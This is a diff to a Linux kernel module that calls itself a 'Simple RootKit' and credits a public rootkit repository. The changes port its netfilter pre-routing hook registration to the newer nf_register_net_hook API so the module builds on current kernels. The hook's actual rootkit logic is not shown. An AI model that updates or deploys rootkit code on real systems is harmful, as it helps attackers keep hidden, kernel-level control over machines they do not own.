@@ -3,6 +3,25 @@
  * Simple RootKit for the EARL project
  */
 
+/*
+No longer original, get the original from here: https://github.com/nisay759/linux-rootkits
+
+This was modified, by me in order to improve & make this compile and run properly on my machine.
+
+Quick modification summary:
+
+
+nf register:
+from: nf_register_hook(&rk_pre_routing);
+to:   nf_register_net_hook(&init_net,&rk_pre_routing);
+
+from: nf_unregister_hook(&rk_pre_routing);
+to:   nf_unregister_net_hook(&init_net,&rk_pre_routing);
+
+
+
+*/
+
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -69,21 +88,27 @@ static struct nf_hook_ops rk_pre_routing = {
 	.priority = NF_IP_PRI_FIRST,
 };
 
+// Modified // 
 static int __init erk_init(void)
 {
+	//nf_register_hook(&rk_pre_routing);
+	nf_register_net_hook(&init_net,&rk_pre_routing);
 	pr_info("NFhook: LKM succefully loaded!\n");
-
-	nf_register_hook(&rk_pre_routing);
-
+	
 	return 0;
 }
 
+// Modified // 
 static void __exit erk_exit(void)
 {
-	nf_unregister_hook(&rk_pre_routing);
+
+	// nf_unregister_hook(&rk_pre_routing);
+	nf_unregister_net_hook(&init_net,&rk_pre_routing);
 	pr_info("NFhook: LKM succefully unloaded!\n");
 }
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yassine Tioual");
 MODULE_VERSION("0.1");
+
+// Again, this is the modified version. Not the original. Find the original from here: https://github.com/nisay759/linux-rootkits
